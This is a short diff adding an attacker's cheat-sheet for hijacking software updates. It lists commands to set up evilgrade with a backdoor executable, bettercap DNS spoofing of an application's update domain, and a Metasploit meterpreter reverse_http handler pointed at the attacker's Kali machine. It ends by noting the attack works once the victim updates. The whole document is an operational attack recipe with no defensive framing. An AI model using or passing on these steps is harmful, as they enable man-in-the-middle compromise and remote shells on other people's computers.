@@ -1,0 +1,20 @@
+cd /opt/evilgrade
+./evilgrade
+show modules
+configure (app)
+set agent /var/www/html/backdoor.exe (example)
+set endsite (the oficial website of app)
+start
+
+bettercap -iface eth0 -caplet /root/spoof.cap (always look in spoof.cap for changes)
+set dns.spoof.all true
+set dns.spoof.domains wpdate.speedbit.com (example of VirtualHost on app)
+dns.spoof on
+
+msfconsole
+payload = windows/meterpreter/reverse_http
+LHOST KALI IP
+LPORT 8080
+exploit
+
+user have to update and then works
